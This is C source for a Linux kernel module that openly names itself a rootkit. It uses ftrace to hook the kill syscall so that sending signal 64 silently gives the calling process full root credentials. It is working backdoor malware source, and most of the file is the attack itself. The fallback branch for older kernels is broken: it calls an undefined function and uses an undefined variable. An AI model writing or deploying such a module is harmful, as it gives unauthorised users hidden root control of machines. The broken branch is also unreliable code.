#include "ftrace_helper.h"

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Robert");
MODULE_DESCRIPTION("kill root hook");
MODULE_VERSION("0.2");

#if defined(CONFIG_x86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif
void setRoot(void);
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long(*orig_kill)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs)
{
	void setRoot(void);

	int sig = regs->si;
	if(sig == 64){
		printk(KERN_INFO "rootkit: THOU SHALL NOW BE ROOT...\n");
		setRoot();
		return 0;
	}

	return orig_kill(regs);
}
#else
static asmlinkage long(*orig_kill)(pid_t pid, int sig);
asmlinkage int hook_kill(pid_t pid, int sig)
{
	void setRoot(void);

	if(sig == 64){
		printk(KERN_INFO "rootkit: THOU SHALL NOW BE ROOT...\n");
		retRoot();
		return 0;
	}

	return orig_kill(regs);
}
#endif
void setRoot(void)
{
	struct cred *root;
	root = prepare_creds();

	if(root ==NULL)
		return;
	// change creds
	root->uid.val   = root->gid.val   = 0;
	root->suid.val  = root->sgid.val  = 0;
	root->euid.val  = root->egid.val  = 0;
	root->fsuid.val = root->fsgid.val = 0;
	commit_creds(root);
}

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};
static int __init rootkit_init(void)
{
	int err;
	err = fh_install_hooks(hooks,ARRAY_SIZE(hooks));
	if(err)
		return err;
	printk(KERN_INFO "rootkit: loaded\n");
	return 0;
}
static void __exit rootkit_exit(void)
{
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: unloaded\n");
}
module_init(rootkit_init);
module_exit(rootkit_exit);








